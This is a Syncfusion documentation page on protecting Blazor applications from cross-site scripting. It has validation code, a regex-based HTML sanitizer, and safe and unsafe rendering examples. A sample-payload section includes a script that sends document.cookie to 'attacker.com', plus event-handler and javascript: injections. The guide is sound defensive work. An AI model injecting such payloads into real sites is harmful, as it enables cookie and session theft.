---
layout: post
title: Cross-Site Scripting (XSS) Security | Syncfusion Blazor
description: Protect Syncfusion Blazor components from XSS using built‑in sanitization, server-side validation, and essential security best practices.
platform: Blazor
control: Common
documentation: ug
---

# Cross-Site Scripting (XSS) Security in Blazor Applications

## Overview

[Cross-Site Scripting (XSS)](https://developer.mozilla.org/en-US/docs/Web/Security/Attacks/XSS) is one of the most common security problems in web applications. This guide explains how to protect a [Syncfusion<sup style="font-size:70%">&reg;</sup> Blazor components](https://www.syncfusion.com/blazor-components) from XSS attacks. It covers built-in client-side sanitization, server-side validation, and safe usage guidelines for components that handle user‑generated content.

## What is cross-site scripting (XSS)?

XSS is a vulnerability where attackers insert harmful code into your application, causing it to run in the user’s browser with the same access level as your app. This can result in:

- **Session hijacking** - Stealing authentication tokens or cookies
- **Data theft** - Accessing sensitive user information
- **Malware distribution** - Redirecting users to malicious sites
- **UI manipulation** - Altering what users see on the screen
- **Credential theft** - Capturing information entered into forms, such as usernames or passwords

### Types of XSS attacks

1. **Stored XSS** - The attacker injects malicious code through user input (e.g., a form field) which is then stored in your database. The code executes whenever another user loads the affected page. This is the most dangerous type.
2. **Reflected XSS** - The harmful script is delivered through a URL or form input and is immediately sent back in the response, causing it to execute in the user’s browser.
3. **DOM-based XSS** - Client-side scripts read unsafe data and write it directly into the page.

## Why XSS matters in Blazor applications?

Blazor Server and Blazor WebAssembly come with different types of XSS risks.

### Blazor Server

- All logic runs on the server, so validation is easier, but XSS can still happen if unsafe content is displayed.
- If an XSS attack happens, an attacker could potentially take control of the SignalR connection that Blazor depends on.
- The user's session state and backend resources could be compromised.

### Blazor WebAssembly

- The application runs in the user's browser, so scripts can directly access the page content and change how the interface works or take over user sessions.
- Client-side files and application logic are fully visible, making it easier for attackers to review the code or interfere with built-in security checks.
- Sensitive data used or stored on the client (such as API tokens or client credentials) is at higher risk; avoid keeping secrets in the browser and secure APIs with proper server-side login and access checks.
- Server-side validation and input cleaning are not applied automatically for client-side code—treat all data coming from the client as unsafe and always validate and clean it on the server.

## XSS threat model and attack vectors

### Common attack vectors

XSS can enter an application in many different ways. The most common source is user input, such as comments, chat messages, or any data that users type into forms. Data received from APIs, uploaded files, or text copied from other websites can also contain harmful scripts. Even information already stored in the database may be unsafe if it was not validated or sanitized before being saved.

### Example attack payloads

{% tabs %}
{% highlight html %}

<!-- Script injection -->
<script>document.location='http://attacker.com/steal?cookie='+document.cookie</script>

<!-- Event handler injection -->
<img src="x" onerror="alert('XSS')" />

<!-- SVG-based attack -->
<svg onload="alert('XSS')">

<!-- Data attribute abuse -->
<div data-bind="innerHTML: maliciousContent"></div>

<!-- JavaScript protocol -->
<a href="javascript:void(document.cookie='stolen')">Click here</a>

{% endhighlight %}
{% endtabs %}

## How to prevent XSS attacks

Protecting your application from XSS requires using several layers of defense.

### 1. Output encoding

Blazor automatically turns special characters in user input into safe, readable text. For example, a `<script>` tag will appear as visible text on the page instead of running as code.

Use `@userInput` whenever you want to safely display text on the page. Only use `MarkupString` when the HTML has already been sanitized on the server.

{% tabs %}
{% highlight html %}

<!-- SAFE - Blazor automatically encodes. -->
<p>@userInput</p>

<!-- UNSAFE - Bypasses encoding and is only safe if sanitized. -->
<p>@((MarkupString)userInput)</p>

{% endhighlight %}
{% endtabs %}

### 2. Input validation

Validating user input as soon as it is received helps prevent harmful content, such as `<script>` tags, from being stored or sent to other users. This acts as an early safety check and helps stop harmful data before it reaches deeper parts of your application.

Follow these practices when validating input.

- Always validate on the server side, not just the client side.
- Set maximum length limits for every input field.
- Use strong typing along with data annotation attributes.
- Block input that clearly contains suspicious or harmful content.
- For file uploads, verify the file type, file size, and actual file content before processing.

{% tabs %}
{% highlight c# %}

using System;
using System.ComponentModel.DataAnnotations;

public class Comment
{
    [Required(ErrorMessage = "Comment is required.")]
    [StringLength(5000, ErrorMessage = "Comment must be 5000 characters or fewer.")]
    [SafeContent(ErrorMessage = "Comment contains potentially unsafe content.")]
    public string Content { get; set; } = string.Empty;
}

public sealed class SafeContentAttribute : ValidationAttribute
{
    protected override ValidationResult IsValid(object value, ValidationContext context)
    {
        var s = (value as string)?.Trim() ?? string.Empty;

        if (s.IndexOf("<script", StringComparison.OrdinalIgnoreCase) >= 0)
            return new ValidationResult(ErrorMessage ?? "Content contains potentially unsafe script tags.");

        if (s.IndexOf("onerror=", StringComparison.OrdinalIgnoreCase) >= 0 ||
            s.IndexOf("onload=",  StringComparison.OrdinalIgnoreCase) >= 0 ||
            s.IndexOf("javascript:", StringComparison.OrdinalIgnoreCase) >= 0)
            return new ValidationResult(ErrorMessage ?? "Content contains potentially unsafe script tags.");

        return ValidationResult.Success;
    }
}

{% endhighlight %}
{% endtabs %}

### 3. HTML sanitization

If your app allows users to enter rich HTML, such as through a rich text editor, you must sanitize it. Sanitization removes harmful or unsafe HTML while keeping safe formatting tags like `<p>`, `<b>`, and `<br>`.

Only the HTML tags you explicitly allow are kept. Always sanitize content before saving it to the database and again before displaying it. This defense-in-depth approach applies to all content, including data from external sources.

#### Built-in sanitization with Syncfusion<sup style="font-size:70%">&reg;</sup> components

The [EnableHtmlSanitizer](https://help.syncfusion.com/cr/blazor/Syncfusion.Blazor.RichTextEditor.SfRichTextEditor.html#Syncfusion_Blazor_RichTextEditor_SfRichTextEditor_EnableHtmlSanitizer) property is available in the Syncfusion<sup style="font-size:70%">&reg;</sup> **[RichTextEditor](https://www.syncfusion.com/blazor-components/blazor-rich-text-editor)** and **[BlockEditor](https://www.syncfusion.com/blazor-components/blazor-block-editor)** components. It provides built-in client-side XSS protection.

#### How EnableHtmlSanitizer works

When `EnableHtmlSanitizer` is enabled (it is `true` by default), the sanitizer does the following:

1. Removes `<script>` tags and their content
2. Removes event handler attributes such as `onclick`, `onerror`, and `onload`
3. Blocks unsafe protocols such as `javascript:` and `data:`
4. Neutralizes other potentially dangerous HTML elements
5. Preserves safe formatting tags (`<p>`, `<b>`, `<i>`, `<ul>`, etc.)

> **Important:** Client-side sanitization alone cannot keep your application fully secure. The `EnableHtmlSanitizer` feature helps with basic cleanup and improves safety, but you still need server-side sanitization to properly protect your application.

#### Why client-side sanitization is not enough

1. **Bypass potential** - Attackers can disable JavaScript or modify requests before they reach the server.
2. **No database protection** - Even if the UI blocks harmful HTML, attackers can still send malicious content that gets stored in your database.
3. **API vulnerability** - API calls made directly to the backend skip all client-side checks.
4. **Zero trust principle** - Client-side validation should never be trusted as a complete security measure.

#### When to use EnableHtmlSanitizer

- To catch accidental HTML and improve the user experience
- To provide an extra layer of defense on top of server-side sanitization
- To give immediate feedback without waiting for a server round trip

#### When not to use EnableHtmlSanitizer

- As the only security mechanism in your app
- As a replacement for server-side sanitization

#### BlockEditor with EnableHtmlSanitizer

{% tabs %}
{% highlight razor %}

@using Syncfusion.Blazor.BlockEditor

<SfBlockEditor Blocks="@BlocksData" EnableHtmlSanitizer="true"></SfBlockEditor>

<button class="e-btn e-primary" @onclick="ShowContent">Show Sanitized Content</button>

@if (!string.IsNullOrEmpty(SafeContent))
{
    <div>
        <h5>Sanitized Output:</h5>
        <pre>@SafeContent</pre>
    </div>
}

@code {
    private string SafeContent { get; set; } = string.Empty;

    private List<BlockModel> BlocksData = new()
    {
        new BlockModel
        {
            BlockType = BlockType.Paragraph,
            Content = new()
            {
                new ContentModel
                {
                    ContentType = ContentType.Text,
                    Content = "<p>Safe content</p><script>alert('XSS');</script>"
                }
            }
        }
    };

    private void ShowContent()
    {
        // EnableHtmlSanitizer removes <script> tags automatically
        SafeContent = BlocksData[0].Content[0].Content;
    }
}

{% endhighlight %}
{% endtabs %}

### Safe HTML rendering in data components

Components that display user-generated or database content, such as **[DataGrid](https://www.syncfusion.com/blazor-components/blazor-datagrid)** and **[ListView](https://www.syncfusion.com/blazor-components/blazor-listview)**, follow the same rule: only render HTML that has been sanitized on the server, or display plain text which Blazor encodes automatically.

#### DataGrid templates

Grid templates should display only content that has already been sanitized on the server. Any unsanitized HTML must never be rendered directly.

#### UNSAFE - Direct HTML rendering

The example below shows a scenario that should never be used. It renders raw HTML from the data source using `MarkupString`, which bypasses Blazor’s HTML encoding.

If the content includes malicious scripts, it can lead to **XSS (Cross‑Site Scripting)** attacks.

{% tabs %}
{% highlight razor %}

@using Syncfusion.Blazor.Grids

@* Unsafe example shown for illustration only; do not use this pattern in production code *@
<SfGrid DataSource="@Comments" AllowPaging="true">
    <GridColumns>
        <GridColumn Field="@nameof(Comment.Content)">
            <Template>
                @{
                    var comment = (context as Comment);
                    @((MarkupString)comment.Content) @* UNSAFE! *@
                }
            </Template>
        </GridColumn>
    </GridColumns>
</SfGrid>

@code {
    private List<Comment> Comments = new()
    {
        new() { Id = 1, Content = "<script>alert('XSS!')</script>" }
    };

    public class Comment
    {
        public int Id { get; set; }
        public string Content { get; set; } = string.Empty;
    }
}

{% endhighlight %}
{% endtabs %}

#### SAFE – Sanitized MarkupString (pre-sanitized data)

When HTML content is sanitized on the server or during data preparation and stored in a dedicated property, rendering it with `MarkupString` is acceptable. 

The example below uses a SanitizedContent property that contains only trusted, pre‑sanitized HTML. Cast to MarkupString only when you can guarantee the content has been properly sanitized and comes from a trusted source.

{% tabs %}
{% highlight razor %}

@using Syncfusion.Blazor.Grids
@* Add the appropriate model namespace for your project *@

<SfGrid DataSource="@Comments" AllowPaging="true">
    <GridColumns>
        <GridColumn Field="@nameof(Comment.Author)" HeaderText="Author" Width="150" />
        <GridColumn HeaderText="Comment" Width="400">
            <Template Context="comment">
                @((MarkupString)((Comment)comment).SanitizedContent)
            </Template>
        </GridColumn>
        <GridColumn Field="@nameof(Comment.CreatedAt)" HeaderText="Date" Width="150" Format="d" />
    </GridColumns>
</SfGrid>

@code {
    private List<Comment> Comments = new();

    protected override void OnInitialized()
    {
        Comments = new List<Comment>
        {
            new()
            {
                Id = 1,
                Author = "John Doe",
                Content = "<p>Safe content</p><script>alert('XSS')</script>",
                SanitizedContent = "<p>Safe content</p>",
                CreatedAt = DateTime.Now.AddDays(-2)
            },
            new()
            {
                Id = 2,
                Author = "Jane Smith",
                Content = "<img src='x' onerror='alert(1)' /><b>Text</b>",
                SanitizedContent = "<b>Text</b>",
                CreatedAt = DateTime.Now
            }
        };
    }

    public class Comment
    {
        public int Id { get; set; }
        public string Author { get; set; } = string.Empty;
        public string Content { get; set; } = string.Empty;
        public string SanitizedContent { get; set; } = string.Empty;
        public DateTime CreatedAt { get; set; }
    }
}

{% endhighlight %}
{% endtabs %}

#### Alternative - text-only rendering

If HTML formatting is not required, render the content as plain text. Blazor automatically encodes all special characters, ensuring no injected scripts can execute regardless of what the data source contains.

{% tabs %}
{% highlight razor %}

@using Syncfusion.Blazor.Grids

<SfGrid DataSource="@Comments" AllowPaging="true">
    <GridColumns>
        <GridColumn Field="@nameof(Comment.Content)" HeaderText="Comment">
            <Template Context="comment">
                @((comment as Comment)?.Content ?? string.Empty) @* Safe – Blazor auto-encodes *@
            </Template>
        </GridColumn>
    </GridColumns>
</SfGrid>

@code {
    private List<Comment> Comments = new()
    {
        new() { Id = 1, Content = "<script>alert('XSS')</script> Plain text" }
    };

    public class Comment
    {
        public int Id { get; set; }
        public string Content { get; set; } = string.Empty;
    }
}
{% endhighlight %}
{% endtabs %}

#### ListView with custom templates

The same safe rendering rules apply to ListView when displaying user-generated content.

The following example conditionally renders content based on whether the message contains HTML. When `IsHtml` is `true`, only pre-sanitized content stored in `SanitizedContent` is rendered as markup. Otherwise, plain text is displayed using Blazor's automatic encoding. This keeps all messages safe regardless of their format.

{% tabs %}
{% highlight razor %}

@using Syncfusion.Blazor.Lists

<SfListView DataSource="@Messages">
    <ListViewFieldSettings TValue="ChatMessage" Text="Content" Id="Id" />
    <ListViewTemplates TValue="ChatMessage">
        <Template Context="message">
            <div>
                <strong>@message.Sender</strong> - @message.Timestamp.ToShortTimeString()
                <div>
                    @if (message.IsHtml)
                    {
                        @((MarkupString)message.SanitizedContent)
                    }
                    else
                    {
                        @message.Content
                    }
                </div>
            </div>
        </Template>
    </ListViewTemplates>
</SfListView>

@code {
    private List<ChatMessage> Messages = new()
    {
        new() { Id = "1", Sender = "Alice", Content = "Plain text", IsHtml = false, Timestamp = DateTime.Now },
        new() { Id = "2", Sender = "Bob", SanitizedContent = "<p>HTML</p>", IsHtml = true, Timestamp = DateTime.Now }
    };

    public class ChatMessage
    {
        public string Id { get; set; } = string.Empty;
        public string Sender { get; set; } = string.Empty;
        public string Content { get; set; } = string.Empty;
        public string SanitizedContent { get; set; } = string.Empty;
        public bool IsHtml { get; set; }
        public DateTime Timestamp { get; set; }
    }
}

{% endhighlight %}
{% endtabs %}

## Server-side sanitization (authoritative)

Server-side sanitization is the **authoritative and required** defense against XSS attacks. While client‑side sanitization (such as the RichTextEditor’s built‑in HTML sanitizer) provides an extra layer of safety, only server-side validation can be fully trusted. All user-generated HTML should be sanitized on the server before saving it to the database and again when retrieving it.

### Built-in .NET sanitization support

.NET includes several built-in APIs that support safe HTML encoding and sanitization. In most scenarios, you do not need extra libraries.

| Namespace | Class | Purpose |
|---|---|---|
| `System.Text.Encodings.Web` | `HtmlEncoder` | Encode all HTML special characters |
| `System.Text.RegularExpressions` | `Regex` | Strip disallowed tags and attributes |
| `System.Web` | `HttpUtility.HtmlEncode` | Encode HTML in non-web contexts |

### Server-side sanitization example

The following example demonstrates how to sanitize user‑entered HTML submitted from the Syncfusion **RichTextEditor** component. The sanitization process removes script tags, script content, disallowed HTML, inline event handlers, and unsafe URL protocols.

{% tabs %}
{% highlight c# tabtitle="~/Services/HtmlSanitizerService.cs"  %}

using System.Collections.Generic;
using System.Text.RegularExpressions;
using System.Text.Encodings.Web;

namespace BlazorApp.Services;

public class HtmlSanitizerService
{
    // List of allowed safe HTML tags. Any tag not in this list is removed.
    private static readonly string[] AllowedTags =
    {
        "p", "br", "strong", "em", "u", "b", "i", "ul", "ol", "li"
    };

    public string Sanitize(string input)
    {
        if (string.IsNullOrWhiteSpace(input))
            return string.Empty;

        var allowList = new HashSet<string>(AllowedTags, StringComparer.OrdinalIgnoreCase);

        // Remove HTML comments, script and style blocks completely.
        string result = Regex.Replace(input, @"<!--[\s\S]*?-->", string.Empty, RegexOptions.IgnoreCase);
        result = Regex.Replace(result, @"<script\b[^>]*>[\s\S]*?</script>", string.Empty, RegexOptions.IgnoreCase);
        result = Regex.Replace(result, @"<style\b[^>]*>[\s\S]*?</style>", string.Empty, RegexOptions.IgnoreCase);

        // Pattern to match tags: groups => (closing?)(tagName)(attributes)
        string tagPattern = @"<\s*(\/?)\s*([a-z0-9]+)([^>]*)>";
        result = Regex.Replace(result, tagPattern, match =>
        {
            var isClosing = !string.IsNullOrEmpty(match.Groups[1].Value);
            var tagName = match.Groups[2].Value;
            var attrText = match.Groups[3].Value;
            if (!allowList.Contains(tagName))
                return string.Empty;
            if (isClosing)
                return $"</{tagName}>";

            // Extract attributes and keep only safe ones (href/src) after protocol checks.
            var keptAttrs = new List<string>();
            string attrPattern = @"([a-z0-9\-]+)\s*=\s*(['""])(.*?)\2|([a-z0-9\-]+)\s*=\s*([^\s>]+)";
            foreach (Match a in Regex.Matches(attrText, attrPattern, RegexOptions.IgnoreCase))
            {
                string name = a.Groups[1].Success ? a.Groups[1].Value : a.Groups[4].Value;
                string value = a.Groups[3].Success ? a.Groups[3].Value : a.Groups[5].Value;
                if (string.IsNullOrEmpty(name))
                    continue;

                // Remove any event handler attributes (onclick, onerror, etc.).
                if (name.StartsWith("on", StringComparison.OrdinalIgnoreCase))
                    continue;

                // Note: Keep href/src handling for future <a>/<img> support; it blocks unsafe protocols like javascript: and data:.
                if (name.Equals("href", StringComparison.OrdinalIgnoreCase) ||
                    name.Equals("src", StringComparison.OrdinalIgnoreCase))
                {
                    var trimmed = value.Trim();
                    if (Regex.IsMatch(trimmed, @"^\s*(javascript:|data:)", RegexOptions.IgnoreCase))
                        continue;

                    // Encode attribute value to prevent injections.
                    var encoded = HtmlEncoder.Default.Encode(trimmed);
                    keptAttrs.Add($"{name}=\"{encoded}\"");
                }

                // All other attributes are discarded for safety.
            }

            var attrString = keptAttrs.Count > 0 ? " " + string.Join(" ", keptAttrs) : string.Empty;
            return $"<{tagName}{attrString}>";
        }, RegexOptions.IgnoreCase);

        return result.Trim();
    }
    public string EncodePlainText(string input)
    {
        // Encodes text to prevent any possibility of HTML execution.
        return HtmlEncoder.Default.Encode(input ?? string.Empty);
    }
}

{% endhighlight %}
{% highlight c# tabtitle="~/Models/Comment.cs" %}

namespace BlazorApp.Models;

public class Comment
{
    // Stores the raw user input after HTML encoding for safe display.
    public string RawInput { get; set; } = string.Empty;

    // Stores the sanitized HTML content after server-side processing.
    public string SanitizedHtml { get; set; } = string.Empty;
}

{% endhighlight %}
{% highlight razor tabtitle="~/SanitizerDemo.razor" %}

@page "/sanitize-demo"
@rendermode InteractiveServer
@using BlazorApp.Services
@using BlazorApp.Models
@using Syncfusion.Blazor.RichTextEditor
@inject HtmlSanitizerService SanitizerService

<h3>Server-Side Sanitization Demo</h3>

<SfRichTextEditor @bind-Value="@InputText" Height="200px"
                  EnableHtmlSanitizer="true">
</SfRichTextEditor>

<button class="btn btn-primary mt-3" @onclick="Process">Sanitize</button>

@if (Comment != null)
{
    <h4 class="mt-4">Raw Input (encoded for safety):</h4>
    <pre>@Comment.RawInput</pre>

    <h4>Sanitized Output (safe HTML rendered):</h4>
    <div style="padding:10px; border:1px solid #ccc">
        @((MarkupString)Comment.SanitizedHtml)
    </div>
}

@code {
    private string InputText = string.Empty;
    private Comment? Comment;

    private void Process()
    {
        // Encodes the raw content and sanitizes the HTML content.
        Comment = new Comment
        {
            RawInput = SanitizerService.EncodePlainText(InputText),
            SanitizedHtml = SanitizerService.Sanitize(InputText)
        };
    }
}

{% endhighlight %}
{% highlight c# tabtitle="Program.cs" %}

...
using Syncfusion.Blazor;
using BlazorApp.Services;
...
// Registers the sanitizer service for dependency injection.
builder.Services.AddSingleton<HtmlSanitizerService>();
// Required to enable all Syncfusion Blazor components.
builder.Services.AddSyncfusionBlazor();
...

{% endhighlight %}
{% endtabs %}

## See also

* [Cross-site scripting (XSS) prevention in Block Editor](https://blazor.syncfusion.com/documentation/block-editor/editor-security/cross-site-script)
 